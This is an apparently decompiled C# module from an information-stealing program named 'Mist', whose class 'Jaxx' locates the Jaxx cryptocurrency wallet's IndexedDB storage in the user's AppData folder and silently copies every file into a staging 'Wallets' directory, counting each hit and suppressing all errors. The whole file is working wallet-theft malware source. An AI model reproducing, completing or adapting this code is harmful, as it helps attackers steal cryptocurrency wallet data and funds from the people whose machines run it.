using System;
using System.IO;

namespace Mist
{
	// Token: 0x0200006C RID: 108
	internal class Jaxx
	{
		// Token: 0x06000297 RID: 663 RVA: 0x00012814 File Offset: 0x00010A14
		public static void JaxxStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Jaxx.JaxxDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Jaxx.JaxxDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
						fileInfo.CopyTo(directorypath + Jaxx.JaxxDir + fileInfo.Name);
					}
					Jaxx.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000167 RID: 359
		public static int count = 0;

		// Token: 0x04000168 RID: 360
		public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";

		// Token: 0x04000169 RID: 361
		public static string JaxxDir2 = Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
